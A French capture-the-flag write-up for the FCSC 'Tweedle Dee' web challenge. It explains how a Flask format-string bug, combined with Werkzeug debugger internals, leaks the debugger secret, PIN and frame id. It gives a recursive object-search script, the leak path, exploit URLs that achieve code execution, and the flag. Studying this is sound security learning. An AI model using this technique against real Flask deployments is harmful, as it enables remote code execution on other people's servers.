 # Weedle-Dee
 
**Auteur: Lxt3h**

## Présentation
Bonjour je m'appelle Bryton BERNARD (Lxt3h), je suis actuellement étudiant à l'école 2600 en 2ème année (équivalent master 1). Etant alternant Reverse Engineer (reverse de protection anti bot) chez Sold Out, j'audit couramment des technologies web. Sur mon temps personnel, je pratique essentiellement du reverse engineering bas niveau.

Je participe souvent à des CTF pour m'amuser et pour apprendre de nouveau concepts.

## Analyse du code

```py
@app.route("/")

def  hello_agent(secret=None):

	ua = request.user_agent
	
	return render_template("index.html", msg=f"Hello {ua}".format(ua=ua))
```

```nginx
worker_processes 4;

events {
    use epoll;
    worker_connections 128;
}

http {
    charset utf-8;

    access_log /dev/stdout combined;
    error_log /dev/stdout debug;

    real_ip_header X-Forwarded-For;
    real_ip_recursive on;
    set_real_ip_from 0.0.0.0/0;

    server {
        listen 2201;
        server_name _;

        location /console {
            return 403 "Bye";
        }

        location @error {
            return 500 "Bye";
        }

        location / {
            error_page 500 503 @error;
            proxy_intercept_errors on;
            proxy_pass http://app:5000;
        }
    }
}
```

Ayant fait le challenge Tweedle Dum je comprend rapidement que le code de la route n'a pas changé et je n'ai accès qu'a une format string. La nouveauté de ce challenge est la configuration nginx. En effet nous n'allons pas pouvoir accéder à /console et nous ne pouvons pas voir les erreurs de debug, tout simplement parce que les erreurs et la route /console sont bloqués.

Nous allons donc devoir trouver un moyen de RCE seulement via des fuites de variables du package werkzeug. Avant tout je vais devoir lire le code source de werkzeug pour savoir qu'est ce que je dois faire fuiter pour exécuter des commandes.

## Analyse du code de werkzeug
Durant la lecture du module de debug de werkzeug j'ai trouvé la fameuse fonction `__call__`. Cette fonction est exécuté depuis chaque route du site en flask. 

```py
def __call__(
        self, environ: WSGIEnvironment, start_response: StartResponse
    ) -> t.Iterable[bytes]:
        """Dispatch the requests."""
        # important: don't ever access a function here that reads the incoming
        # form data!  Otherwise the application won't have access to that data
        # any more!
        request = Request(environ)
        response = self.debug_application
        if request.args.get("__debugger__") == "yes":
            cmd = request.args.get("cmd")
            arg = request.args.get("f")
            secret = request.args.get("s")
            frame = self.frames.get(request.args.get("frm", type=int))  # type: ignore
            if cmd == "resource" and arg:
                response = self.get_resource(request, arg)  # type: ignore
            elif cmd == "pinauth" and secret == self.secret:
                response = self.pin_auth(request)  # type: ignore
            elif cmd == "printpin" and secret == self.secret:
                response = self.log_pin_request()  # type: ignore
            elif (
                self.evalex
                and cmd is not None
                and frame is not None
                and self.secret == secret
                and self.check_pin_trust(environ)
            ):
                response = self.execute_command(request, cmd, frame)  # type: ignore
        elif (
            self.evalex
            and self.console_path is not None
            and request.path == self.console_path
        ):
            response = self.display_console(request)  # type: ignore
        return response(environ, start_response)
```

Le fonctionnement de cette fonction est simple. Tout d'abord il va prendre la requête envoyé par le client et va regarder si il existe un paramètre **GET** de type `__debugger__` qui est set à `yes`, si tel est le cas il va vérifier l'existence de certains paramètre **GET** et selon les paramètres il va changer sa réponse par le résultat de la fonction qui est associé au paramètre. Ici il y a deux fonction qui nous intéresse. Tout d'abord il y a `pinauth` et il y a la dernière option qui nous indique en effet que si nous mettons comme paramètre, `cmd`,`frame`,`secret` et `pin` il va exécuter une commande dans la frame qui lui est passé en paramètre.

### self.pin_auth()

```py
elif cmd == "pinauth" and secret == self.secret:
	response = self.pin_auth(request) # type: ignore
```

Comme on peut le voir ci-dessus cette commande nous dit que si l'on met en paramètre le bon secret, nous allons pouvoir checker si le pin d'entrée est valide.

```py
def pin_auth(self, request: Request) -> Response:
        """Authenticates with the pin."""
        exhausted = False
        auth = False
        trust = self.check_pin_trust(request.environ)
        pin = t.cast(str, self.pin)

        # If the trust return value is `None` it means that the cookie is
        # set but the stored pin hash value is bad.  This means that the
        # pin was changed.  In this case we count a bad auth and unset the
        # cookie.  This way it becomes harder to guess the cookie name
        # instead of the pin as we still count up failures.
        bad_cookie = False
        if trust is None:
            self._fail_pin_auth()
            bad_cookie = True

        # If we're trusted, we're authenticated.
        elif trust:
            auth = True

        # If we failed too many times, then we're locked out.
        elif self._failed_pin_auth > 10:
            exhausted = True

        # Otherwise go through pin based authentication
        else:
            entered_pin = request.args["pin"]

            if entered_pin.strip().replace("-", "") == pin.replace("-", ""):
                self._failed_pin_auth = 0
                auth = True
            else:
                self._fail_pin_auth()

        rv = Response(
            json.dumps({"auth": auth, "exhausted": exhausted}),
            mimetype="application/json",
        )
        if auth:
            rv.set_cookie(
                self.pin_cookie_name,
                f"{int(time.time())}|{hash_pin(pin)}",
                httponly=True,
                samesite="Strict",
                secure=request.is_secure,
            )
        elif bad_cookie:
            rv.delete_cookie(self.pin_cookie_name)
        return 
```

Pour expliquer rapidement, ce script va pouvoir être appelé depuis la commande `pinauth` et seulement si le secret mit dans les paramètres **GET** est valide.
On peut voir dans la fonction qu'il va simplement prendre le `pin` valide et le comparer avec le `pin` entrée depuis le paramètre **GET** `pin`, si tel est le cas il va nous set un cookie qui validera l'authentification.

## self.execute_command()
```py
 elif (
                self.evalex
                and cmd is not None
                and frame is not None
                and self.secret == secret
                and self.check_pin_trust(environ)
            ):
                response = self.execute_command(request, cmd, frame)  # type: ignore
```
Si tout nos paramètres sont remplit il exécutera la commande passé dans le paramètre `cmd`.

```py
def execute_command(  # type: ignore[return]
        self,
        request: Request,
        command: str,
        frame: DebugFrameSummary | _ConsoleFrame,
    ) -> Response:
        """Execute a command in a console."""
        contexts = self.frame_contexts.get(id(frame), [])

        with ExitStack() as exit_stack:
            for cm in contexts:
                exit_stack.enter_context(cm)

            return Response(frame.eval(command), mimetype="text/html")
```

Cette fonction ne fait qu'exécuter notre commande dans la frame passé en paramètre.

Maintenant que nous savons comment exécuter une commande sans aller dans le chemin `/console` nous allons pouvoir commencer à faire fuiter les valeurs que nous avons besoin.

## Fuite des données

En analysant le module de debug on remarque que notre `__call__` est dans une class appelé `DebuggedApplication`. A son instance, cette classe va initialiser dans des variables globales de class: le secret, le pin et les frames.

Pendant des heures j'ai cherché à faire fuiter une instance de la classe `DebuggedApplication`, je n'ai malheureusement jamais réussi à trouver manuellement.

<center>
<img src="https://i.imgflip.com/7k0hx1.jpg">
</center>

Pendant le premier challenge Tweedle Dum, j'ai utilisé une fonction récursive de recherche de chemin que j'ai trouvé sur une writeup CTF time.
https://ctftime.org/writeup/10851

Grâce à cette fonction j'ai réussi à trouver l'emplacement de mon secret, ce qui m'a permit de faire fuiter le reste des données très facilement.

Voilà comment j'ai procédé:

```py
from flask import Flask, request, render_template
from werkzeug.debug import DebuggedApplication
from werkzeug.debug import DebugTraceback

# No bruteforce needed, this is just here so you don't lock yourself or others out by accident
DebuggedApplication._fail_pin_auth = lambda self: None

app = Flask(__name__)


def search(obj, max_depth):
    
    visited_clss = []
    visited_objs = []
    
    def visit(obj, path='obj', depth=0):
        yield path, obj
        
        if depth == max_depth:
            return

        elif isinstance(obj, (int, float, bool, str, bytes)):
            return

        elif isinstance(obj, type):
            if obj in visited_clss:
                return
            visited_clss.append(obj)
            print(obj)

        else:
            if obj in visited_objs:
                return
            visited_objs.append(obj)
        
        # attributes
        for name in dir(obj):
            if name.startswith('__') and name.endswith('__'):
                if name not in  ('__globals__', '__class__', '__self__',
                                 '__weakref__', '__objclass__', '__module__'):
                    continue
            attr = getattr(obj, name)
            yield from visit(attr, '{}.{}'.format(path, name), depth + 1)
        
        # dict values
        if hasattr(obj, 'items') and callable(obj.items):
            try:
                for k, v in obj.items():
                    yield from visit(v, '{}[{}]'.format(path, repr(k)), depth)
            except:
                pass
        
        # items
        elif isinstance(obj, (set, list, tuple, frozenset)):
            for i, v in enumerate(obj):
                yield from visit(v, '{}[{}]'.format(path, repr(i)), depth)
            
    yield from visit(obj)



@app.route("/<secret>")
@app.route("/")
def hello_agent(secret=None):
    ua = request.user_agent
    
    if secret:
        print("Secret: ", secret, flush=True)
        for path, obj in search(ua, 60):
            if str(obj) == secret:
                print(path, flush=True)

    return render_template("index.html", msg=f"Hello {ua}".format(ua=ua))

# TODO: add the vulnerable code here
```

Etant donné que nous ne pouvions pas avoir le secret, j'ai supprimé dans la config nginx l'erreur 500 pour faire fuiter mon premier secret et ensuite l'envoyer depuis ma route `/secret`. Lorsque ma fonction `hello_agent` va détecter le paramètre `secret` il va effectuer une recherche récursive sur tout l'environnement pour trouver le chemin qui contient la string passé en paramètre.

Path:
```py
ua.__class__.to_header.__globals__[__loader__].__class__.__weakref__.__objclass__.get_data.__globals__[__loader__].create_module.__globals__[__builtins__][__build_class__].__self__.copyright.__class__._Printer__setup.__globals__[sys].modules[__main__].main.__globals__[inspect].BlockFinder.tokeneater.__globals__[importlib].find_loader.__globals__[metadata].Deprecated.get.__globals__[email]._policybase.Compat32.__weakref__.__objclass__.clone.__globals__[_has_surrogates].__globals__[urllib].request.AbstractBasicAuthHandler._parse_realm.__globals__[http].cookiejar.Cookie.get_nonstandard_attr.__globals__[_threading].Barrier._break.__globals__[_active][140601691986744]._target.__self__.app
```

Sachant que app est une instance de `DebuggedApplication` j'ai pu facilement accéder à mes variables de classe.
![](https://cdn.discordapp.com/attachments/858439417743540225/1102149221639004200/image.png)

Secret: `ezbNJnGGcodQwxNdtmUo`
Pin: `892-048-462`
Frame: `111144189284128`

Nous avons fait fuité toute les informations. Passons à l'exploitation.

## Exploitation
Rappelons donc les étapes d'exploitation
- Générer un cookie d'authentification via le secret et le pin
- Utiliser nos leak pour exécuter la fonctionnalité d'exécution de commande.

Payload:
`https://tweedle-dee.france-cybersecurity-challenge.fr/?&__debugger__=yes&s=ezbNJnGGcodQwxNdtmUo&pin=892-048-462&cmd=pinauth`

![](https://cdn.discordapp.com/attachments/858439417743540225/1102150100664463392/image.png)

![](https://cdn.discordapp.com/attachments/858439417743540225/1102150266414977044/image.png)

Une fois le cookie généré nous allons exécuter une commande.

Payload:
`https://tweedle-dee.france-cybersecurity-challenge.fr/?__debugger__=yes&frm=111144189284128&&s=ezbNJnGGcodQwxNdtmUo&pin=892-048-462&cmd=7*7`

![](https://cdn.discordapp.com/attachments/858439417743540225/1102150892628742204/image.png)

![](https://cdn.discordapp.com/attachments/858439417743540225/1102151110615109632/image.png)

![](https://cdn.discordapp.com/attachments/858439417743540225/1102151298335395850/image.png)

**Flag:** `FCSC{2c149fdce9b3db514fa6adf094121999fea5c38fbb3370350d90925238499cf2}`

## Conclusion

J'ai beaucoup appris sur le fonctionnement de l'environnement python.

## Remerciement
Je tenais à remercier l'auteur du challenge **Bitk** j'ai énormément apprécié le challenge et la plupart de ses challenges par ailleurs. J'ai trouvé ce CTF très bénéfique pour mon apprentissage alors merci aux organisateurs et aux créateurs des challenges.
